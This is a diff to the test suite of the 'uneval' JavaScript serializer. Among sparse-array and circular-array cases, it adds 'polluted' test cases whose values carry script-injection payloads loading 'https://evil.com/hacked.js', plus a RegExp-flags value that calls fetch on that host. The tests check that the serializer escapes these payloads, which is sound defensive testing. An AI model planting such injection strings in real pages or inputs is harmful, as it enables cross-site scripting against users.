@@ -6,13 +6,13 @@
 /* eslint-disable no-new-wrappers */
 
 import { assertNoPoisoning, restoreGlobals } from '@fast-check/poisoning'
-import { fc, test } from '@fast-check/vitest'
+import { test } from '@fast-check/vitest'
 import { afterEach, expect } from 'vitest'
 import { anythingArb } from './arbs.ts'
 import type { UnevalOptions } from './index.ts'
 import uneval from './package.ts'
 
-const ignoredRootRegex = /^(?:__vitest_.*|Person)$/u
+const ignoredRootRegex = /^(?:console|__vitest_.*|Person)$/u
 const poisoningAfterEach = () => {
   try {
     assertNoPoisoning({ ignoredRootRegex })
@@ -21,7 +21,6 @@ const poisoningAfterEach = () => {
     throw error
   }
 }
-fc.configureGlobal({ afterEach: poisoningAfterEach })
 afterEach(poisoningAfterEach)
 
 test.prop([anythingArb], { numRuns: 100_000 })(`uneval works`, value => {
@@ -93,6 +92,17 @@ test.each<Case>([
   { name: `boxed false`, value: new Boolean(false), source: `Object(!1)` },
   { name: `true`, value: true, source: `!0` },
   { name: `boxed true`, value: new Boolean(true), source: `Object(!0)` },
+  {
+    name: `polluted boxed boolean`,
+    value: (() => {
+      const value = new Boolean()
+      // @ts-expect-error Purposefully using the wrong type.
+      value.valueOf = () => `</script><script src='https://evil.com/hacked.js'>`
+      return value
+    })(),
+    source: `Object("<\\u002fscript><script src='https://evil.com/hacked.js'>")`,
+    roundtrips: false,
+  },
   {
     name: `custom boolean`,
     value: true,
@@ -222,6 +232,17 @@ test.each<Case>([
     name: `boxed negative infinity`,
     value: new Number(-Infinity),
     source: `Object(-1/0)`,
+  },
+  {
+    name: `polluted boxed number`,
+    value: (() => {
+      const value = new Number(42)
+      // @ts-expect-error Purposefully using the wrong type.
+      value.valueOf = () => `</script><script src='https://evil.com/hacked.js'>`
+      return value
+    })(),
+    source: `Object("<\\u002fscript><script src='https://evil.com/hacked.js'>")`,
+    roundtrips: false,
   },
   {
     name: `custom number`,
@@ -497,6 +518,16 @@ test.each<Case>([
     source: `Object("😀")`,
   },
   {
+    name: `polluted boxed string`,
+    value: (() => {
+      const value = new String(42)
+      value.valueOf = () => `</script><script src='https://evil.com/hacked.js'>`
+      return value
+    })(),
+    source: `Object("<\\u002fscript><script src='https://evil.com/hacked.js'>")`,
+    roundtrips: false,
+  },
+  {
     name: `custom string`,
     value: `Hello!`,
     options: { custom: customString },
@@ -581,6 +612,11 @@ test.each<Case>([
     source: `Symbol.for("howdy")`,
   },
   {
+    name: `global symbol registry symbol with closing script tag`,
+    value: Symbol.for(`</script>`),
+    source: `Symbol.for("<\\u002fscript>")`,
+  },
+  {
     name: `custom symbol`,
     value: Symbol(`hi`),
     options: { custom: customSymbol },
@@ -621,6 +657,113 @@ test.each<Case>([
     name: `sparse array with middle empty slots`,
     value: [1, , , , , 2],
     source: `[1,,,,,2]`,
+  },
+  {
+    name: `small empty sparse array`,
+    value: Array(27),
+    source: `Array(27)`,
+  },
+  {
+    name: `small sparse array with trailing empty slots`,
+    value: (() => {
+      const array: unknown[] = Array(27)
+      array[4] = 42
+      return array
+    })(),
+    source: `[,,,,42,,,,,,,,,,,,,,,,,,,,,,,]`,
+  },
+  {
+    name: `small sparse array with no trailing empty slots`,
+    value: (() => {
+      const array: unknown[] = Array(27)
+      array[26] = 42
+      return array
+    })(),
+    source: `Object.assign([],{26:42})`,
+  },
+  {
+    name: `medium sparse array with trailing empty slots`,
+    value: (() => {
+      const array: unknown[] = Array(50)
+      array[4] = 42
+      return array
+    })(),
+    source: `Object.assign(Array(50),{4:42})`,
+  },
+  {
+    name: `medium sparse array with no trailing empty slots`,
+    value: (() => {
+      const array: unknown[] = Array(50)
+      array[49] = 42
+      return array
+    })(),
+    source: `Object.assign([],{49:42})`,
+  },
+  {
+    name: `large empty sparse array`,
+    value: Array(1000),
+    source: `Array(1000)`,
+  },
+  {
+    name: `large sparse array with non-trailing value`,
+    value: (() => {
+      const array: unknown[] = Array(100)
+      array[4] = 42
+      return array
+    })(),
+    source: `Object.assign(Array(100),{4:42})`,
+  },
+  {
+    name: `large sparse array with trailing value`,
+    value: (() => {
+      const array: unknown[] = Array(100)
+      array[99] = 42
+      return array
+    })(),
+    source: `Object.assign([],{99:42})`,
+  },
+  {
+    name: `extremely sparse array with non-trailing value`,
+    value: (() => {
+      const value: unknown[] = Array(100)
+      value[50] = 1
+      return value
+    })(),
+    source: `Object.assign(Array(100),{50:1})`,
+  },
+  {
+    name: `extremely sparse array with trailing value`,
+    value: (() => {
+      const value: unknown[] = []
+      value[50] = 1
+      return value
+    })(),
+    source: `Object.assign([],{50:1})`,
+  },
+  {
+    name: `extremely sparse array with multiple values`,
+    value: (() => {
+      const value: unknown[] = []
+      value[10] = `a`
+      value[50] = `b`
+      value[1000] = `c`
+      return value
+    })(),
+    source: `Object.assign([],{10:"a",50:"b",1000:"c"})`,
+  },
+  {
+    name: `polluted array`,
+    value: (() => {
+      const value = Object.create(Array.prototype) as Record<
+        PropertyKey,
+        unknown
+      >
+      value[Symbol.toStringTag] = `Array`
+      Object.defineProperty(value, `length`, { value: Number.MAX_SAFE_INTEGER })
+      return value
+    })(),
+    source: `Array(9007199254740991)`,
+    roundtrips: false,
   },
   {
     name: `custom array`,
@@ -973,6 +1116,21 @@ test.each<Case>([
     source: `new Set([1,2,3])`,
   },
   {
+    name: `polluted Set`,
+    value: (() => {
+      const value = Object.create(Set.prototype) as Set<unknown>
+      Object.defineProperty(value, Symbol.iterator, {
+        *value() {
+          yield `</script><script src='https://evil.com/hacked.js'>`
+        },
+        configurable: true,
+      })
+      return value
+    })(),
+    source: `new Set(["<\\u002fscript><script src='https://evil.com/hacked.js'>"])`,
+    roundtrips: false,
+  },
+  {
     name: `custom Set`,
     value: new Set([1, 2, 3]),
     options: {
@@ -1014,6 +1172,21 @@ test.each<Case>([
       [3, 4],
     ]),
     source: `new Map([[1,2],[3,4]])`,
+  },
+  {
+    name: `polluted Map`,
+    value: (() => {
+      const value = Object.create(Map.prototype) as Map<unknown, unknown>
+      Object.defineProperty(value, Symbol.iterator, {
+        *value() {
+          yield [`key`, `</script><script src='https://evil.com/hacked.js'>`]
+        },
+        configurable: true,
+      })
+      return value
+    })(),
+    source: `new Map([["key","<\\u002fscript><script src='https://evil.com/hacked.js'>"]])`,
+    roundtrips: false,
   },
   {
     name: `custom Map`,
@@ -1285,6 +1458,30 @@ test.each<Case>([
     source: `/😀/`,
   },
   {
+    name: `polluted RegExp source`,
+    value: (() => {
+      const value = new RegExp(`abc`)
+      Object.defineProperty(value, `source`, {
+        value: `</script><script src='https://evil.com/hacked.js'>`,
+      })
+      return value
+    })(),
+    source: `new RegExp("<\\u002fscript><script src='https://evil.com/hacked.js'>")`,
+    roundtrips: false,
+  },
+  {
+    name: `polluted RegExp flags`,
+    value: (() => {
+      const value = new RegExp(`abc`)
+      Object.defineProperty(value, `flags`, {
+        value: `+fetch('https://evil.com/hacked.js')`,
+      })
+      return value
+    })(),
+    source: `new RegExp("abc","+fetch('https://evil.com/hacked.js')")`,
+    roundtrips: false,
+  },
+  {
     name: `custom RegExp`,
     value: /abc/,
     options: {
@@ -1320,6 +1517,17 @@ test.each<Case>([
   // Date
   { name: `valid Date`, value: new Date(42), source: `new Date(42)` },
   { name: `invalid Date`, value: new Date(`oh no!`), source: `new Date(NaN)` },
+  {
+    name: `polluted Date`,
+    value: (() => {
+      const value = new Date(42)
+      // @ts-expect-error Purposefully using the wrong type.
+      value.valueOf = () => `</script><script src='https://evil.com/hacked.js'>`
+      return value
+    })(),
+    source: `new Date("<\\u002fscript><script src='https://evil.com/hacked.js'>")`,
+    roundtrips: false,
+  },
   {
     name: `custom Date`,
     value: new Date(42),
@@ -1609,6 +1817,18 @@ test.each<Case>([
     source: `new URL("https://tomeraberba.ch/")`,
   },
   {
+    name: `polluted URL`,
+    value: (() => {
+      const value = new URL(`https://example.com`)
+      Object.defineProperty(value, `href`, {
+        value: `</script><script src='https://evil.com/hacked.js'>`,
+      })
+      return value
+    })(),
+    source: `new URL("<\\u002fscript><script src='https://evil.com/hacked.js'>")`,
+    roundtrips: false,
+  },
+  {
     name: `custom URL`,
     value: new URL(`https://tomeraberba.ch`),
     options: {
@@ -1661,6 +1881,17 @@ test.each<Case>([
       [`a`, `c`],
     ]),
     source: `new URLSearchParams("a=b&a=c")`,
+  },
+  {
+    name: `polluted URLSearchParams`,
+    value: (() => {
+      const value = new URLSearchParams(`a=1`)
+      value.toString = () =>
+        `</script><script src='https://evil.com/hacked.js'>`
+      return value
+    })(),
+    source: `new URLSearchParams("<\\u002fscript><script src='https://evil.com/hacked.js'>")`,
+    roundtrips: false,
   },
   {
     name: `custom URLSearchParams`,
@@ -3174,6 +3405,25 @@ test.each<Case>([
       return circular1
     })(),
     source: `((b,a=[b])=>(b[0]=a,b[1]=b,a))([,])`,
+  },
+  {
+    name: `circular sparse array`,
+    value: (() => {
+      const circular: unknown[] = Array(100)
+      circular[40] = circular
+      return circular
+    })(),
+    source: `(a=>a[40]=a)(Array(100))`,
+  },
+  {
+    name: `circular sparse array with some non-circular values`,
+    value: (() => {
+      const circular: unknown[] = Array(100)
+      circular[40] = circular
+      circular[50] = 42
+      return circular
+    })(),
+    source: `(a=>a[40]=a)(Object.assign(Array(100),{50:42}))`,
   },
   {
     name: `circular own __proto__`,
